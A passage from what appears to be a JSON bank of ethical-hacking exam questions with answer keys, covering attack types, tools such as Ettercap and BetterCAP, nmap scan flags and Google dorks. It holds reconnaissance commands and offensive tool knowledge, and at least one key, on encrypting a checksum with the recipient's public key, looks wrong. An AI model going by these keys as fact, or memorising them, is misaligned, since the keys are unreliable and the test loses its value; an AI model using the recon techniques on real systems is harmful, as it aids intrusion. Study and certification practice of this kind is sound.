    "question": "Ivan, a black-hat hacker, performs a man-in-the-middle attack. To do this, it uses a rogue wireless AP and embeds a malicious applet in all HTTP connections. When the victims went to any web page, the applet ran. Which of the following tools could Ivan probably use to inject HTML code?",
    "answer": "Ettercap",
    "hint": null,
    "options": [
      "Wireshark",
      "tcpdump",
      "Ettercap",
      "Aircrack-ng"
    ]
  },
  {
    "question": "The evil hacker Ivan wants to attack the popular air ticket sales service. After careful study, he discovered that the web application is vulnerable to introduced malicious JavaScript code through the application form. This code does not cause any harm to the server itself, but when executed on the client's computer, it can steal his personal data. What kind of attack is Ivan preparing to use?",
    "answer": "XSS",
    "hint": null,
    "options": [
      "CSRF",
      "LDAP Injection",
      "XSS",
      "SQL injection"
    ]
  },
  {
    "question": "What is the first and most important phase that is the starting point for penetration testing in the work of an ethical hacker?",
    "answer": "Reconnaissance",
    "hint": null,
    "options": [
      "Gaining Access",
      "Scanning",
      "Maintaining Access",
      "Reconnaissance"
    ]
  },
  {
    "question": "Identify the attack by the description: It is the wireless version of the phishing scam. This is an attack-type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises but has been set up to eavesdrop on wireless communications. When performing this attack, an attacker fools wireless users into connecting a device to a tainted hotspot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent website and luring people there.",
    "answer": "Evil Twin",
    "hint": null,
    "options": [
      "Signal Jamming",
      "Sinkhole",
      "Evil Twin",
      "Collision"
    ]
  },
  {
    "question": "The company is trying to prevent the security breach by applying a security policy in which all Web browsers must automatically delete their HTTP browser cookies upon termination. Identify the security breach that the company is trying to prevent?",
    "answer": "Attempts by attackers to access websites that trust the Web browser user by stealing the employee's authentication credentials.",
    "hint": null,
    "options": [
      "Attempts by attackers to access passwords stored on the employee's computer.",
      "Attempts by attackers to determine the employee's web browser usage patterns.",
      "Attempts by attackers to access the user and password information stored in the company's SQL database.",
      "Attempts by attackers to access websites that trust the Web browser user by stealing the employee's authentication credentials."
    ]
  },
  {
    "question": "Identify which term corresponds to the following description: It is can potentially adversely impact a system through unauthorized access, destruction, disclosure, denial of service or modification of data.",
    "answer": "Threat",
    "hint": null,
    "options": [
      "Vulnerability",
      "Risk",
      "Attack",
      "Threat"
    ]
  },
  {
    "question": "IPsec is a suite of protocols developed to ensure the integrity, confidentiality, and authentication of data communications over an IP network. Which protocol is NOT included in the IPsec suite?",
    "answer": "Media Access Control (MAC)",
    "hint": null,
    "options": [
      "Encapsulating Security Protocol (ESP)",
      "Media Access Control (MAC)",
      "Authentication Header (AH)",
      "Security Association (SA)"
    ]
  },
  {
    "question": "Which of the following is an attack where used precomputed tables of hashed passwords?",
    "answer": "Rainbow Table Attack",
    "hint": null,
    "options": [
      "Dictionary Attack",
      "Hybrid Attack",
      "Rainbow Table Attack",
      "Brute Force Attack"
    ]
  },
  {
    "question": "In which phase of the ethical hacking process can Google hacking be used? For example: allintitle: root passwd",
    "answer": "Reconnaissance",
    "hint": null,
    "options": [
      "Reconnaissance",
      "Scanning and Enumeration",
      "Maintaining Access",
      "Gaining Access"
    ]
  },
  {
    "question": "Black-hat hacker Ivan wants to determine the status of ports on a remote host. He wants to do this quickly but imperceptibly for IDS systems. For this, he uses a half-open scan that doesn’t complete the TCP three-way handshake. What kind of scanning does Ivan use?",
    "answer": "TCP SYN (Stealth) Scan",
    "hint": null,
    "options": [
      "PSH Scan",
      "TCP SYN (Stealth) Scan",
      "XMAS scans",
      "FIN scan"
    ]
  },
  {
    "question": "Alex, an employee of a law firm, receives an email with an attachment \"Court_Notice_09082020.zip\". There is a file inside the archive \"Court_Notice_09082020.zip.exe\". Alex does not notice that this is an executable file and runs it. After that, a window appears with the notification \"This word document is corrupt\" and at the same time, malware copies data to APPDATA\\local directory takes place in the background and begins to beacon to a C2 server to download additional malicious binaries. What type of malware has Alex encountered?",
    "answer": "Trojan",
    "hint": null,
    "options": [
      "Trojan",
      "Worm",
      "Key-Logger",
      "Macro Virus"
    ]
  },
  {
    "question": "What property is provided by using hash?",
    "answer": "Integrity",
    "hint": null,
    "options": [
      "Integrity",
      "Confidentiality",
      "Authentication",
      "Availability"
    ]
  },
  {
    "question": "Assume an attacker gained access to the internal network of a small company and launches a successful STP manipulation attack. What are his next steps?",
    "answer": "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer.",
    "hint": null,
    "options": [
      "He will repeat the same attack against all L2 switches of the network.",
      "He will activate OSPF on the spoofed root bridge.",
      "He will repeat this action so that it escalates to a DoS attack.",
      "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer."
    ]
  },
  {
    "question": "Monitoring your company’s assets is one of the most important jobs you can perform. What warnings should you try to reduce when configuring security tools, such as security information and event management (SIEM) solutions or intrusion detection systems (IDS)?",
    "answer": "False Positives and False Negatives",
    "hint": null,
    "options": [
      "Only True Negatives",
      "True Positives and True Negatives",
      "False Positives and False Negatives",
      "Only False Positives"
    ]
  },
  {
    "question": "Jenny, a pentester, conducts events to detect viruses in systems. She uses a detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities. Which of the following methods does Jenny use?",
    "answer": "Code Emulation.",
    "hint": null,
    "options": [
      "Code Emulation.",
      "Integrity checking.",
      "Heuristic Analysis.",
      "Vulnerability scanner."
    ]
  },
  {
    "question": "Which of the following is an access control mechanism that allows multiple systems to use a CAS that permits users to authenticate once and gain access to multiple systems?",
    "answer": "Single sign-on",
    "hint": null,
    "options": [
      "Single sign-on",
      "Discretionary Access Control (DAC)",
      "Role-Based Access Control (RBAC)",
      "Mandatory access control (MAC)"
    ]
  },
  {
    "question": "Identify the type of partial breaks in which the attacker discovers a functionally equivalent algorithm for encryption and decryption, but without learning the key?",
    "answer": "Global deduction.",
    "hint": null,
    "options": [
      "Information deduction.",
      "Global deduction.",
      "Instance deduction.",
      "Total break."
    ]
  },
  {
    "question": "Which of the following is a Denial-of-service vulnerability for which security patches have not yet been released, or there is no effective means of protection?",
    "answer": "Zero-Day",
    "hint": null,
    "options": [
      "Zero-Day",
      "Smurf",
      "Yo-yo",
      "APDoS"
    ]
  },
  {
    "question": "The fraudster Lisandro, masquerading as a large car manufacturing company recruiter, massively sends out job offers via e-mail with the promise of a good salary, a friendly team, unlimited coffee, and medical insurance. He attaches Microsoft Word or Excel documents to his letters into which he embeds a special virus written in Visual Basic that runs when the document is opened and infects the victim's computer. What type of virus does Lisandro use?",
    "answer": "Macro virus",
    "hint": null,
    "options": [
      "Polymorphic code",
      "Macro virus",
      "Stealth virus",
      "Multipart virus"
    ]
  },
  {
    "question": "What flags will be set when scanning when using the following command: #nmap -sX host.companydomain.com",
    "answer": "URG, PUSH and FIN are set.",
    "hint": null,
    "options": [
      "ACK flag is set.",
      "SYN flag is set.",
      "URG, PUSH and FIN are set.",
      "SYN and ACK flags are set."
    ]
  },
  {
    "question": "Which of the following USB tools using to copy files from USB devices silently?",
    "answer": "USBDumper",
    "hint": null,
    "options": [
      "USBSnoopy",
      "USBGrabber",
      "USBDumper",
      "USBSniffer"
    ]
  },
  {
    "question": "Identify the encryption algorithm by the description: Symmetric-key block cipher having a classical 12- or 16-round Feistel network with a block size of 64 bits for encryption, which includes large 8 × 32-bit S-boxes based on bent functions, modular addition and subtraction, key-dependent rotation, and XOR operations. This cipher also uses a \"masking\" key and a \"rotation\" key for performing its functions.",
    "answer": "CAST-128",
    "hint": null,
    "options": [
      "CAST-128",
      "DES",
      "GOST",
      "AES"
    ]
  },
  {
    "question": "You need to increase the security of keys used for encryption and authentication. For these purposes, you decide to use a technique to enter an initial key to an algorithm that generates an enhanced key resistant to brute-force attacks. Which of the following techniques will you use?",
    "answer": "Key stretching",
    "hint": null,
    "options": [
      "KDF",
      "PKI",
      "Key reinstallation",
      "Key stretching"
    ]
  },
  {
    "question": "John, a black hacker, is trying to do an SMTP enumeration. What useful information can John gather during a Simple Mail Transfer Protocol enumeration?",
    "answer": "He can use two internal commands VRFY and EXPN, which provide information about valid users, email addresses, etc.",
    "hint": null,
    "options": [
      "He can receive a list of all mail proxy server addresses used by the company.",
      "He can find information about the daily outgoing message limits before mailboxes are locked.",
      "He can use the internal command RCPT provides a list of ports open.",
      "He can use two internal commands VRFY and EXPN, which provide information about valid users, email addresses, etc."
    ]
  },
  {
    "question": "Identify the correct sequence of steps involved in the vulnerability-management life cycle.",
    "answer": "Identify assets and create a baseline -> Vulnerability scan -> Risk assessment -> Remediation -> Verification -> Monitor.",
    "hint": null,
    "options": [
      "Vulnerability scan -> Risk assessment -> Identify assets and create a baseline -> Remediation -> Monitor -> Verification.",
      "Remediation -> Monitor -> Verification -> Vulnerability scan -> Risk assessment -> Identify assets and create a baseline.",
      "Vulnerability scan -> Identify assets and create a baseline -> Risk assessment -> Remediation -> Verification -> Monitor.",
      "Identify assets and create a baseline -> Vulnerability scan -> Risk assessment -> Remediation -> Verification -> Monitor."
    ]
  },
  {
    "question": "Which term from the following describes a set of vulnerabilities that allows spyware to be installed on smartphones with the iOS operating system, allowing those who conducted espionage to track and monitor every action on the device?",
    "answer": "Trident",
    "hint": null,
    "options": [
      "Androrat",
      "DroidSheep",
      "Trident",
      "Zscaler"
    ]
  },
  {
    "question": "Ivan, a black hat hacker, got the username from the target environment. In conditions of limited time, he decides to use a list of common passwords, which he will pass as an argument to the hacking tool. Which of the following is the method of attack that Ivan uses?",
    "answer": "Dictionary attack.",
    "hint": null,
    "options": [
      "Dictionary attack.",
      "Password spraying attack.",
      "Known plaintext attack.",
      "Smudge attack."
    ]
  },
  {
    "question": "Your boss has instructed you to introduce a hybrid encryption software program into a web application to secure email messages. You are planning to use free software that uses both symmetric-key cryptography and asymmetric-key cryptography for improved speed and secure key exchange. Which of the following meets these requirements?",
    "answer": "GPG",
    "hint": null,
    "options": [
      "GPG",
      "S/MIME",
      "SMTP",
      "PGP"
    ]
  },
  {
    "question": "In which of the following attacks does the attacker receive information from data sources such as voice assistants, multimedia messages, and audio files by using a malicious app to breach speech privacy?",
    "answer": "Spearphone attack",
    "hint": null,
    "options": [
      "Spearphone attack",
      "Smudge attack",
      "DroidDream",
      "SIM swap scam"
    ]
  },
  {
    "question": "You need to hide the file in the Linux system. Which of the following characters will you type at the beginning of the filename?",
    "answer": ".",
    "hint": null,
    "options": [
      "! (Exclamation mark)",
      "_ (Underscore)",
      "~ (Tilda)",
      ". (Period)"
    ]
  },
  {
    "question": "The attacker needs to collect information about his victim - Maria. She is an extrovert who often posts a large amount of private information, photos, and location tags of recently visited places on social networks. Which automated tool should an attacker use to gather information to perform other sophisticated attacks?",
    "answer": "Hootsuite",
    "hint": null,
    "options": [
      "VisualRoute",
      "Hootsuite",
      "HULK",
      "Ophcrack"
    ]
  },
  {
    "question": "To collect detailed information about services and applications running on identified open ports, nmap can perform version detection. To do this, various probes are used to receive responses from services and applications. Nmap requests probe information from the target host and analyzes the response, comparing it with known responses for various services, applications, and versions. Which of the options will allow you to run this scan?",
    "answer": "-sV",
    "hint": null,
    "options": [
      "-sV",
      "-sX",
      "-sF",
      "-sN"
    ]
  },
  {
    "question": "Alex was assigned to perform a penetration test against a website using Google dorks. He needs to get results with file extensions. Which operator should Alex use to achieve the desired result?",
    "answer": "filetype:",
    "hint": null,
    "options": [
      "filetype:",
      "define:",
      "site:",
      "inurl:"
    ]
  },
  {
    "question": "When scanning with Nmap, you found a firewall. Now you need to determine whether it is a stateful or stateless firewall. Which of the following options is best for you to use?",
    "answer": "-sA",
    "hint": null,
    "options": [
      "-sT",
      "-sM",
      "-sA",
      "-sO"
    ]
  },
  {
    "question": "The company \"Work Town\" hired a cybersecurity specialist to perform a vulnerability scan by sniffing the traffic on the network to identify the active systems, network services, applications, and vulnerabilities. What type of vulnerability assessment should be performed for \"Work Town\"?",
    "answer": "Passive assessment.",
    "hint": null,
    "options": [
      "Passive assessment.",
      "Internal assessment.",
      "External assessment.",
      "Active assessment."
    ]
  },
  {
    "question": "Which of the following tools is an automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other vulnerabilities in the target server?",
    "answer": "Netsparker",
    "hint": null,
    "options": [
      "Netsparker",
      "WebCopier Pro",
      "Infoga",
      "NCollector Studio"
    ]
  },
  {
    "question": "The attacker knows about a vulnerability in a bare-metal cloud server that can enable him to implant malicious backdoors in firmware. Also, the backdoor can persist even if the server is reallocated to new clients or businesses that use it as an IaaS. What type of cloud attack can be performed by an attacker exploiting the vulnerability discussed in the above scenario?",
    "answer": "Cloudborne attack",
    "hint": null,
    "options": [
      "Man-in-the-cloud (MITC) attack",
      "Cloud cryptojacking",
      "Cloudborne attack",
      "Metadata spoofing attack"
    ]
  },
  {
    "question": "Which of the following is an anonymizer that masks real IP addresses and ensures complete and continuous anonymity for all online activities?",
    "answer": "https://www.guardster.com",
    "hint": null,
    "options": [
      "https://www.wolframalpha.com",
      "https://karmadecay.com",
      "https://www.guardster.com",
      "https://www.baidu.com"
    ]
  },
  {
    "question": "What is the name of the technique in which attackers move around the territory in a moving vehicle and use special equipment and software to search for vulnerable and accessible WiFi networks?",
    "answer": "Wardriving",
    "hint": null,
    "options": [
      "Spectrum analysis",
      "Rogue access point",
      "Wardriving",
      "Wireless sniffing"
    ]
  },
  {
    "question": "Storing cryptographic keys carries a particular risk. In cryptography, there is a mechanism in which a third party stores copies of private keys. By using it, you are can ensure that in the case of a catastrophe, be it a security breach, lost or forgotten keys, natural disaster, or otherwise, your critical keys are safe. What is the name of this mechanism?",
    "answer": "Key escrow",
    "hint": null,
    "options": [
      "Key encapsulation",
      "Key schedule",
      "Key escrow",
      "Key whitening"
    ]
  },
  {
    "question": "Enabling SSI directives allows developers to add dynamic code snippets to static HTML pages without using full-fledged client or server languages. However, suppose the server is incorrectly configured (for example, allowing the exec directive) or the data is not strictly verified. In that case, an attacker can change or enter directives to perform malicious actions. What kind of known attack are we talking about?",
    "answer": "Server-side includes injection",
    "hint": null,
    "options": [
      "Server-side JS injection",
      "Server-side includes injection",
      "Server-side template injection",
      "CRLF injection"
    ]
  },
  {
    "question": "John sends an email to his colleague Angela and wants to ensure that the message will not be changed during the delivery process. He creates a checksum of the message and encrypts it using asymmetric cryptography. What key did John use to encrypt the checksum?",
    "answer": "Angela's public key.",
    "hint": null,
    "options": [
      "His own private key.",
      "Angela's public key.",
      "Angela's private key",
      "His own public key."
    ]
  },
  {
    "question": "Which of the following is an example of a scareware social engineering attack?",
    "answer": "A pop-up appears to a user stating, \"Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue.\"",
    "hint": null,
    "options": [
      "A pop-up appears to a user stating, \"You have won money! Click here to claim your prize!\"",
      "A pop-up appears to a user stating, \"Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue.\"",
      "A banner appears to a user stating, \"Your order has been delayed. Click here to find out your new delivery date.\"",
      "A banner appears to a user stating, \"Your password has expired. Click here to update your password.\""
    ]
  },
  {
    "question": "Which of the following SOAP extensions apply security to Web services and maintain the integrity and confidentiality of messages?",
    "answer": "WS-Security",
    "hint": null,
    "options": [
      "WS-Policy",
      "WS-Security",
      "WSDL",
      "WS-BPEL"
    ]
  },
  {
    "question": "The date and time of the remote host can theoretically be used against some systems to use weak time-based random number generators in other services. Which option in Zenmap will allow you to make ICMP Timestamp ping?",
    "answer": "-PP",
    "hint": null,
    "options": [
      "-PU",
      "-PN",
      "-PY",
      "-PP"
    ]
  },
  {
    "question": "Which of the following is the type of attack that tries to overflow the CAM table?",
    "answer": "MAC flooding",
    "hint": null,
    "options": [
      "MAC flooding",
      "Evil twin attack",
      "DNS flood",
      "DDoS attack"
    ]
  },
  {
    "question": "Whois services allow you to get a massive amount of valuable information at the stage of reconnaissance. Depending on the target's location, they receive data from one of the five largest regional Internet registries (RIR). Which of the following RIRs should the Whois service contact if you want to get information about an IP address registered in France?",
    "answer": "RIPE NCC",
    "hint": null,
    "options": [
      "LACNIC",
      "RIPE NCC",
      "ARIN",
      "APNIC"
    ]
  },
  {
    "question": "Which of the following is the fastest way to perform content enumeration on a web server using the Gobuster tool?",
    "answer": "Performing content enumeration using a wordlist.",
    "hint": null,
    "options": [
      "Performing content enumeration using the brute-force mode and 10 threads.",
      "Performing content enumeration using the brute-force mode and random file extensions.",
      "Skipping SSL certificate verification.",
      "Performing content enumeration using a wordlist."
    ]
  },
  {
    "question": "What is the name of a popular tool (or rather, an entire integrated platform written in Java) based on a proxy used to assess the security of web applications and conduct practical testing using a variety of built-in tools?",
    "answer": "Burp Suite",
    "hint": null,
    "options": [
      "Wireshark",
      "Burp Suite",
      "Nmap",
      "CxSAST"
    ]
  },
  {
    "question": "What is the \"wget 192.168.0.10 -q -S\" command used for?",
    "answer": "Using wget to perform banner grabbing on the webserver.",
    "hint": null,
    "options": [
      "Flooding the web server with requests to perform a DoS attack.",
      "Performing content enumeration on the web server to discover hidden folders.",
      "Using wget to perform banner grabbing on the webserver.",
      "Download all the contents of the web page locally."
    ]
  },
  {
    "question": "Identify the type of SQL injection where attacks extend the results returned by the original query, enabling attackers to run two or more statements if they have the same structure as the original one?",
    "answer": "Union SQL injection",
    "hint": null,
    "options": [
      "Error-based SQL Injection",
      "Union SQL injection",
      "Blind SQL Injection",
      "Time-based SQL Injection"
    ]
  },
  {
    "question": "Adam is a shopaholic, and he constantly surfs on the Internet in search of discounted products. The hacker decided to take advantage of this weakness of Adam and sent a fake email containing a deceptive page link to his social media page with information about a sale. Adam anticipating the benefit didn't notice the malicious link, clicked on them and logged in to that page using his valid credentials. Which of the following tools did the hacker probably use?",
    "answer": "Evilginx",
    "hint": null,
    "options": [
      "Evilginx",
      "PyLoris",
      "XOIC",
      "sixnet-tools"
    ]
  },
  {
    "question": "Which of the scenarios corresponds to the behaviour of the attacker from the example below: The attacker created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection.",
    "answer": "Unspecified proxy activities.",
    "hint": null,
    "options": [
      "Use of command-line interface.",
      "Data staging.",
      "Unspecified proxy activities.",
      "DNS tunnelling."
    ]
  },
  {
    "question": "The cyber kill chain is essentially a cybersecurity model created by Lockheed Martin that traces the stages of a cyber-attack, identifies vulnerabilities, and helps security teams to stop the attacks at every stage of the chain. At what stage does the intruder transmit the malware via a phishing email or another medium?",
    "answer": "Delivery",
    "hint": null,
    "options": [
      "Installation",
      "Delivery",
      "Actions on Objective",
      "Weaponization"
    ]
  },
  {
    "question": "The network administrator has received the task to eliminate all unencrypted traffic inside the company's network. During the analysis, it detected unencrypted traffic in port UDP 161. Which of the following protocols uses this port and what actions should the network administrator take to fix this problem?",
    "answer": "SNMP and he should change it to SNMP V3.",
    "hint": null,
    "options": [
      "SNMP and he should change it to SNMP V2.",
      "CMIP and enable the encryption for CMIP.",
      "RPC and the best practice is to disable RPC completely.",
      "SNMP and he should change it to SNMP V3."
    ]
  },
  {
    "question": "Ivan, an evil hacker, spreads Emotet malware through the malicious script in the organization he attacked. After infecting the device, he used Emote to spread the infection across local networks and beyond to compromise as many machines as possible. He reached this thanks to a tool which is a self-extracting RAR file (containing bypass and service components) to retrieve information related to network resources such as writable share drives. What tool did Ivan use?",
    "answer": "Credential enumerator",
    "hint": null,
    "options": [
      "NetPass.exe",
      "Outlook scraper",
      "Mail PassView",
      "Credential enumerator"
    ]
  },
  {
    "question": "This attack exploits a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. Also, it further allows the transmission of web-service requests and response messages using different TCP connections. Which of the following attacks matches the description above?",
    "answer": "WS-Address spoofing",
    "hint": null,
    "options": [
      "WS-Address spoofing",
      "Soap Array Attack",
      "SOAPAction spoofing",
      "XML Flooding"
    ]
  },
  {
    "question": "Identify the type of fault injection attack to IoT device by description: During this attack attacker injects faults into the power supply that can be used for remote execution, also causing the skipping of key instructions. Also, an attacker injects faults into the clock network used for delivering a synchronized signal across the chip.",
    "answer": "Power/clock/reset glitching",
    "hint": null,
    "options": [
      "Frequency/voltage tampering",
      "Temperature attack",
      "Optical, EMFI, BBI",
      "Power/clock/reset glitching"
    ]
  },
  {
    "question": "Identify Google advanced search operator which helps an attacker gather information about websites that are similar to a specified target URL?",
    "answer": "[related:]",
    "hint": null,
    "options": [
      "[inurl:]",
      "[related:]",
      "[link:]",
      "[site:]"
    ]
  },
  {
    "question": "Identify the wrong answer in terms of Range:",
    "answer": "802.16",
    "hint": null,
    "options": [
      "802.11b",
      "802.11a",
      "802.16",
      "802.11n"
    ]
  },
  {
    "question": "You need to identify the OS on the attacked machine. You know that TTL: 64 and Window Size: 5840. Which is OS running on the attacked machine?",
    "answer": "Linux OS",
    "hint": null,
    "options": [
      "Linux OS",
      "Mac OS",
      "Google's customized Linux",
      "Windows OS"
    ]
  },
  {
    "question": "Which of the following is the best description of The final phase of every successful hacking - Clearing tracks?",
    "answer": "During a cyberattack, a hacker corrupts the event logs on all machines.",
    "hint": null,
    "options": [
      "During a cyberattack, a hacker corrupts the event logs on all machines.",
      "During a cyberattack, a hacker injects a rootkit into a server.",
      "After a system is breached, a hacker creates a backdoor.",
      "A hacker gains access to a server through an exploitable vulnerability."
    ]
  },
  {
    "question": "Ivan, a black hacker, wants to get information about IoT cameras and devices used by the attacked company. For these purposes, he will use a tool that collects information about the IoT devices connected to a network, open ports and services, and the attack surface area. Thanks to this tool, Ivan constantly monitors every available server and device on the internet. This opportunity will allow him to exploit these devices in the future. Which of the following tools did Ivan use to carry out this attack?",
    "answer": "Censys",
    "hint": null,
    "options": [
      "Wapiti",
      "Lacework",
      "NeuVector",
      "Censys"
    ]
  },
  {
    "question": "You need to protect the company's network from imminent threats. To complete this task, you will enter information about threats into the security devices in a digital format to block and identify inbound and outbound malicious traffic entering the company's network. Which of the following types of threat intelligence will you use?",
    "answer": "Technical threat intelligence.",
    "hint": null,
    "options": [
      "Tactical threat intelligence.",
      "Strategic threat intelligence.",
      "Operational threat intelligence.",
      "Technical threat intelligence."
    ]
  },
  {
    "question": "During testing, you discovered a vulnerability that allows hackers to gain unauthorized access to API objects and perform actions such as viewing, updating and deleting sensitive data. Which of the following API vulnerabilities have you found?",
    "answer": "No ABAC validation.",
    "hint": null,
    "options": [
      "Code Injections.",
      "No ABAC validation.",
      "Business Logic Flaws.",
      "RBAC Privilege Escalation."
    ]
  },
  {
    "question": "Which of the following algorithms is a symmetric key block cipher with a block size of 128 bits representing a 32-round SP-network operating on a block of four 32-bit words?",
    "answer": "Serpent",
    "hint": null,
    "options": [
      "SHA-256",
      "CAST-128",
      "Serpent",
      "RC4"
    ]
  },
  {
    "question": "Andrew, an evil hacker, research the website of the company which he wants to attack. During the research, he finds a web page and understands that the company's application is potentially vulnerable to Server-side Includes Injection. Which web-page file type did Andrew find while researching the site?",
    "answer": ".stm",
    "hint": null,
    "options": [
      ".cms",
      ".stm",
      ".html",
      ".rss"
    ]
  },
  {
    "question": "Black-hat hacker Ivan attacked the SCADA system of the industrial water facility. During the exploration process, he discovered that outdated equipment was being used, the human-machine interface (HMI) was directly connected to the Internet and did not have any security tools or authentication mechanism. This allowed Ivan to control the system and influence all processes (including water pressure and temperature). What category does this vulnerability belong to?",
    "answer": "Lack of Authorization/Authentication and Insecure Defaults.",
    "hint": null,
    "options": [
      "Lack of Authorization/Authentication and Insecure Defaults.",
      "Code Injection.",
      "Memory Corruption.",
      "Credential Management."
    ]
  },
  {
    "question": "The attacker disabled the security controls of NetNTLMv1 by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and RestrictSendingNTLMTraffic. His next step was to extract all the non-network logon tokens from all the active processes to masquerade as a legitimate user to launch further attacks. Which of the following attacks was performed by the attacker?",
    "answer": "Internal monologue attack",
    "hint": null,
    "options": [
      "Dictionary attack",
      "Rainbow table attack",
      "Internal monologue attack",
      "Phishing attack"
    ]
  },
  {
    "question": "The attacker created a fraudulent email with a malicious attachment and sent it to employees of the target organization. The employee opened this email and clicked on the malicious attachment. Because of this, the malware was downloaded and injected into the software used in the victim's system occurred. Further, the malware propagated itself to other networked systems and finally damaging the industrial automation component. Which of the following attack techniques was used by the attacker?",
    "answer": "Spear-phishing attack",
    "hint": null,
    "options": [
      "Spear-phishing attack",
      "HMI-based attack",
      "Reconnaissance attack",
      "SMishing attack"
    ]
  },
  {
    "question": "Which of the following is a Kubernetes component that can assign nodes based on the overall resource requirement, data locality, software/hardware/policy restrictions, and internal workload interventions?",
    "answer": "Kube-scheduler",
    "hint": null,
    "options": [
      "Kube-scheduler",
      "Kube-controller-manager",
      "cloud-controller-manager",
      "Kube-apiserver"
    ]
  },
  {
    "question": "Modern security mechanisms can stop various types of DDoS attacks, but if they only check incoming traffic and mostly ignore return traffic, attackers can bypass them under the disguise of a valid TCP session by carrying an SYN, multiple ACK, and one or more RST or FIN packets. What is the name of such an attack?",
    "answer": "Spoofed session flood attack.",
    "hint": null,
    "options": [
      "Spoofed session flood attack.",
      "UDP flood attack.",
      "Peer-to-peer attack.",
      "Ping-of-death attack."
    ]
  },
  {
    "question": "Identify the security model by description: In this security model, every user in the network maintains a ring of public keys. Also, a user needs to encrypt a message using the receiver’s public key, and only the receiver can decrypt the message using their private key.",
    "answer": "Web of trust",
    "hint": null,
    "options": [
      "Web of trust",
      "Transport Layer Security",
      "Zero trust security model",
      "Secure Socket Layer"
    ]
  },
  {
    "question": "Scammers can query the DNS server to determine whether a specific DNS record is cached, thereby determining your organization’s browsing habits. This can disclose sensitive information such as financial institutions visited recently or other sensitive websites that a company might not want to be public knowledge of. Which of the proposed attacks fits this description?",
    "answer": "DNS cache snooping",
    "hint": null,
    "options": [
      "DNSSEC zone walking",
      "DNS zone walking",
      "DNS cache snooping",
      "DNS cache poisoning"
    ]
  },
  {
    "question": "Evil hacker Ivan knows that his target point and user are compatible with WPA2 and WPA 3 encryption mechanisms. He decided to install a rogue access point with only WPA2 compatibility in the vicinity and forced the victim to go through the WPA2 four-way handshake to connect. As soon as the connection is established, Ivan plans to use automated tools to crack WPA2-encrypted messages. Which of the following attacks does Ivan want to perform?",
    "answer": "Downgrade security attack",
    "hint": null,
    "options": [
      "Downgrade security attack",
      "Side-channel attack",
      "Cache-based attack",
      "Timing-based attack"
    ]
  },
  {
    "question": "You are investigating to determine the reasons for compromising the computers of your company's employees. You will find out that the machines were infected through sites that employees often visit. When an employee opens a site, there is a redirect from a web page, and malware downloads to the machine. Which of the following attacks did the attacker perform on your company's employees?",
    "answer": "Watering hole",
    "hint": null,
    "options": [
      "Watering hole",
      "MarioNet",
      "Clickjacking",
      "DNS rebinding"
    ]
  },
  {
    "question": "You want to prevent possible SQLi attacks on your site. To do this, you decide to use a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted. Which of the following practices are you going to adopt?",
    "answer": "Whitelist validation.",
    "hint": null,
    "options": [
      "Enforce least privileges.",
      "Blacklist validation.",
      "Whitelist validation.",
      "Output encoding."
    ]
  },
  {
    "question": "Which of the following services is running on port 21 by default?",
    "answer": "File Transfer Protocol",
    "hint": null,
    "options": [
      "Domain Name System",
      "Border Gateway Protocol",
      "Service Location Protocol",
      "File Transfer Protocol"
    ]
  },
  {
    "question": "Which of the following is a Metasploit post-exploitation module that is used to escalate privileges on systems?",
    "answer": "getsystem",
    "hint": null,
    "options": [
      "keylogrecorder",
      "getsystem",
      "getuid",
      "autoroute"
    ]
  },
  {
    "question": "Are you sure your network is perfectly protected and no evil hacker Ivan listens to all your traffic? What, ignorance is the greatest source of happiness. There is a powerful tool written in Go that will allow an attacker to carry out a Man in the middle (MITM) attack using, for example, ordinary arp spoofing. What kind of tool are we talking about?",
    "answer": "BetterCAP",
    "hint": null,
    "options": [
      "DerpNSpoof",
      "Gobbler",
      "Wireshark",
      "BetterCAP"
    ]
  },
  {
    "question": "John, a black hat hacker, wants to find out if there are honeypots in the system that he will attack. For this purpose, he will use a time-based TCP fingerprinting method to validate the response to a computer and the response of a honeypot to a manual SYN request. Identify which of the following techniques will John use?",
    "answer": "Detecting the presence of Honeyd honeypots.",
    "hint": null,
    "options": [
      "Detecting the presence of Snort_inline honeypots.",
      "Detecting the presence of UML Honeypot.",
      "Detecting the presence of Honeyd honeypots.",
      "Detecting the presence of Sebek-based honeypots."
    ]
  },
  {
    "question": "During the pentest, Maria, the head of the blue team, discovered that the new online service has problems with the authentication mechanism. The old password can be reset by correctly answering the secret question, and the sending form does not have protection using a CAPTCHA, which allows a potential attacker to use a brute force attack. What is the name of such an attack in the Enumeration of Common Disadvantages (CWE)?",
    "answer": "Weak password recovery mechanism.",
    "hint": null,
    "options": [
      "Insecure transmission of credentials.",
      "Verbose failure messages.",
      "User impersonation.",
      "Weak password recovery mechanism."
    ]
  },
  {
    "question": "Such techniques as, for example, password cracking or enumeration are much more efficient and faster if performed using a wordlist. Of course, there are a huge number of them in different directions on the Internet or already installed in your Kali or Parrot OS, but an attacker can create his wordlist specifically for the target he is attacking. This requires conducting intelligence and collecting information about the victim. Many tools allow you to automate this process. Which of the following tools can scan a website and create a wordlist?",
    "answer": "CeWL",
    "hint": null,
    "options": [
      "Psiphon",
      "Orbot",
      "CeWL",
      "Shadowsocks"
    ]
  },
  {
    "question": "Rajesh wants to make the Internet a little safer and uses his skills to scan the networks of various organizations and find vulnerabilities even without the owners' permission. He informs the company owner about the problems encountered, but if the company ignores him and does not fix the vulnerabilities, Rajesh publishes them publicly and forces the company to respond. What type of hacker is best suited for Rajesh?",
    "answer": "Gray hat",
    "hint": null,
    "options": [
      "Gray hat",
      "Cybercriminal",
      "White hat",
      "Black hat"
    ]
  },
  {
    "question": "Alexa, a college student, decided to go to a cafe. While waiting for her order, she decided to connect to a public Wi-Fi network without additional security tools such as a VPN. How can she verify that nobody is not performing an ARP spoofing attack on her laptop?",
    "answer": "She should check her ARP table and see if there is one IP address with two different MAC addresses.",
    "hint": null,
    "options": [
